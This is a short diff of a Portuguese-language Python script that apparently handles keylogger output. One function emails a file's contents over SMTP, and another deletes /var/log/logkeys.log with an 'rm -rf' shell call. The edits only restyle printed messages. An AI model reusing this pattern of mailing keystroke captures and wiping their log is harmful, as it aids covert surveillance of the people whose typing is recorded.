@@ -79,7 +79,7 @@ def enviar():
         msg = header + open_archive.read()
         smtp.sendmail(user, email, msg)
         smtp.quit()
-        print("""\033[1;36m\n [++] Email enviado\033[1;m""")
+        print("""\033[1;36m\n[++] Email enviado\033[1;m""")
         sleep(2)
 
     except smtplib.SMTPRecipientsRefused:
@@ -142,10 +142,10 @@ def sistema():
         sleep(2)
         if os.path.exists("/var/log/logkeys.log") == True:
             os.system("rm -rf /var/log/logkeys.log")
-            print("\n[++] Arquivo apagado!")
+            print("""\033[1;36m\n[!] Arquivo apagado!\033[1;m""")
             sleep(2)
         else:
-            print("\n[++] Arquivos não existe ou já foi apagado!")
+            print("""\033[1;91m\n[!] Arquivos não existe ou já foi apagado!\n\033[1;m""")
             sleep(2)
         os.system("clear")
         sistema()
